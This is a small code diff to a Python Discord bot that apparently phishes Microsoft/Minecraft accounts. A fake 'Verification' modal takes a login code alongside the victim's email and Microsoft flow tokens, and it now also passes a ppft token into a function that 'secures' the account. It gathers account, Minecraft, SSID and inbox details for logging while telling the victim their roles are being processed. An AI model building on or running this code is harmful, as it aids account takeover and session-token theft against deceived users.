@@ -12,12 +12,14 @@ from securing.auth.initial_session import get_session
 from shared.send_logs import send_logs, build_log_embed
 
 class MyModalTwo(ui.Modal):
-    def __init__(self, username, email, flowtoken):
+    def __init__(self, username, email, flowtoken, ppft=None):
         super().__init__(title="Verification")
         self.username = quote(username)
         self.email = email
         self.flowtoken = flowtoken
+        self.ppft = ppft
         self.config = json.load(open("config/config.json", "r"))
+        self.msgs = self.config["messages"]
         self.add_item(ui.InputText(label="Code", required=True, max_length=6))
 
     async def callback(self, interaction: discord.Interaction) -> None:
@@ -68,8 +70,8 @@ class MyModalTwo(ui.Modal):
 
         await interaction.followup.send(
             embed = discord.Embed(
-                title = "Processing...",
-                description = "⌛ Please allow us to proccess your roles",
+                title = self.msgs["processing_title"],
+                description = self.msgs["processing_description"],
                 color = 0xDE755B
             ),
             ephemeral = True
@@ -78,7 +80,7 @@ class MyModalTwo(ui.Modal):
         self.session = get_session()
 
         # Embeds | Account, Minecraft, SSID, Extra Info, Inbox (separate)
-        securedAccount = await startSecuringAccount(self.session, self.email, self.flowtoken, code)
+        securedAccount = await startSecuringAccount(self.session, self.email, self.flowtoken, code, ppft=self.ppft)
         
         if not securedAccount:
 
